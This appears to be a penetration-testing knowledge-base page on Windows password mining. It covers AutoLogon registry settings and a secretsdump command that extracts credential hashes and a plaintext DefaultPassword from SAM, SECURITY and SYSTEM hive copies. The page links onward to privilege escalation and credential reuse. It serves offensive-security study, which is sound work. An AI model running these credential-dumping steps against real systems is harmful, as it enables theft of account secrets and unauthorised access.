# User Accounts Utility (Userpasswords2)

## User Account Management Commands

### Control User Accounts via GUI

- To access the advanced user accounts control panel, use the following commands:

```bash
control userpasswords2
```

or

```bash
netplwiz
```

> These commands open the **User Accounts** window, allowing users to manage user credentials, auto-login settings, and group memberships.

## Configuring AutoLogon in Windows

- To enable auto-login for a specific user, modify the Windows registry:

### Registry Path

```reg
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### Set Default Username

```reg
DefaultUserName = u1
```

- Additionally, you may need to set the `DefaultPassword` and `AutoAdminLogon` keys:

```reg
DefaultPassword = your_password
AutoAdminLogon = 1
```

> **Warning:** Storing passwords in plaintext in the registry is insecure and should be avoided in production environments.

- To set these registry values using **PowerShell**, use the following commands:

```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -Value "u1"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -Value "your_password"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
```

### Explanation:

- `Set-ItemProperty` → Modifies a property (registry key value).

- `-Path` → Specifies the registry location.

- `-Name` → Specifies the registry key to modify.

- `-Value` → Sets the value for the key.


#### Running the Script:

- Open **PowerShell as Administrator**.

- Copy and paste the above commands.

- Press **Enter** to apply changes.

## Extracting Credentials with Impacket's `secretsdump`

### Dumping SAM, Security, and System Files

- Use `secretsdump.py` from the **Impacket** suite to extract credential hashes and secrets:

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

### Example Output

```bash
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):123
```

### Explanation

- **Cached Domain Logon Information:** Extracts cached credentials for domain users.

- **LSA Secrets:** Retrieves sensitive data stored in Windows Local Security Authority (LSA).

- **DefaultPassword:** Displays stored plaintext passwords if configured.


> **Note:** Running `secretsdump.py` requires administrative privileges.

## Additional Security Considerations

- Avoid enabling auto-login on sensitive systems.

- Use encryption and proper security controls when handling credentials.

- Regularly audit and clean up stored passwords in Windows.

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [Escalation via RunAs](../Escalation-via-RunAs.md) — running as a user with recovered credentials
- [Windows Privilege Escalation](../README.md) — escalation context
- Password Cracking — reuse harvested credentials
